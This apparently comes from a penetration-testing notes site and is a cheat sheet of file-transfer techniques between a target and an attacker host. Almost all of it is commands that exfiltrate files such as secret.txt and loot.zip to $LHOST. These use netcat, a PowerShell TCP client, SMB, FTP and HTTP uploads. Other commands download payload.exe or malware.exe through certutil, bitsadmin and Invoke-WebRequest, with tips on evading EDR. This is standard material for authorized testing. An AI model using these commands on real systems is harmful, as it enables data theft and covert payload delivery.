# File Transfer Techniques

| Method | When to use |
|---|---|
| `python3 -m http.server` | Fastest for pulling files to attacker from Linux target |
| `impacket-smbserver share .` | Windows targets: mount as a drive letter |
| `curl -T file http://$LHOST/upload` | Pushing files to attacker-controlled server |
| `nc -w3 $LHOST 4444 < file` | Simple, no dependencies |
| Certutil (Windows) | `certutil -urlcache -split -f http://$LHOST/file out` |
| DNS exfil | When only port 53 outbound is allowed |

!!! tip "Tip"
    For Windows file transfers, `certutil` and `bitsadmin` are LOLBins, no dropped binaries. `certutil -urlcache -split -f <url> <output>` works on most Windows versions.

---

## Netcat

=== "Linux → Linux"

    ```bash
    # Sender
    nc -lvnp 4444 < secret.txt

    # Receiver
    nc $LHOST 4444 > retrieved.txt
    ```

=== "Windows → Linux"

    Windows doesn't ship with netcat. PowerShell TCP client is the drop-in replacement:

    ```powershell
    # Sender (Windows, no external binaries)
    $c = New-Object System.Net.Sockets.TCPClient('$LHOST',4444)
    $s = $c.GetStream()
    $b = [IO.File]::ReadAllBytes('C:\Users\Public\secret.txt')
    $s.Write($b,0,$b.Length); $s.Close()
    ```

    ```bash
    # Receiver (Linux)
    nc -lvnp 4444 > retrieved.txt
    ```

---

## SCP

=== "Linux → Linux"

    ```bash
    scp secret.txt <user>@$LHOST:/tmp/
    ```

=== "Windows → Linux"

    ```powershell
    scp C:\Users\Public\secret.txt <user>@$LHOST:/home/<user>/
    ```

---

## SMB

=== "Windows (net use)"

    ```powershell
    net use \\$LHOST\shared_folder /user:attacker secretpassword
    copy C:\sensitive_data.txt \\$LHOST\shared_folder\
    ```

=== "Linux (smbclient)"

    ```bash
    smbclient -U <user> //$LHOST/C$ -c 'put backdoor.exe'
    ```

---

## FTP

### Interactive Upload

```bash
ftp $IP
put secret.txt
```

### Automated via PowerShell

```powershell
$WebClient = New-Object System.Net.WebClient
$WebClient.UploadFile("ftp://$LHOST/secret.txt", "C:\sensitive.txt")
```

---

## HTTP

### Python HTTP Server (attacker-side)

```bash
python3 -m http.server 8000
```

### Download on Target

```bash
wget http://$LHOST:8000/secret.txt -O /tmp/secret.txt
curl http://$LHOST/malware.exe -o /tmp/malware.exe
```

---

## PowerShell

### Download File

```powershell
Invoke-WebRequest -Uri "http://$LHOST/payload.exe" -OutFile "C:\Windows\Temp\payload.exe"
```

### Certutil (LOLBin)

```powershell
certutil -urlcache -split -f http://$LHOST/payload.exe C:\Windows\Temp\payload.exe
```

### BITS Transfer (LOLBin)

Lower-signature than certutil on modern EDR. Uses the Background Intelligent Transfer Service, the same one Windows Update uses.

```powershell
Start-BitsTransfer -Source http://$LHOST/payload.exe -Destination C:\Windows\Temp\payload.exe
bitsadmin /transfer job /download /priority foreground http://$LHOST/payload.exe C:\Windows\Temp\payload.exe
```

### Upload via WebClient / Invoke-RestMethod

```powershell
# Upload
(New-Object System.Net.WebClient).UploadFile('http://$LHOST/upload', 'C:\loot.zip')
Invoke-RestMethod -Uri http://$LHOST/upload -Method POST -InFile C:\loot.zip
```
